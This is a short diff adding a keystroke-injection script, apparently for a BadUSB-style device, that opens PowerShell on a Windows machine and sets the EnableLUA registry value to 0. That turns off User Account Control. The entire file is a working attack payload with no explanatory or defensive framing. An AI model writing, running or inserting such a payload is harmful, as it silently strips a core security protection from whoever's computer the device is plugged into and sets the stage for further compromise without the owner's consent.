@@ -1,0 +1,6 @@
+WTIME 1500
+SCRIPT Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ENTER
+WTIME 4000
+SCRIPT Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
+ENTER
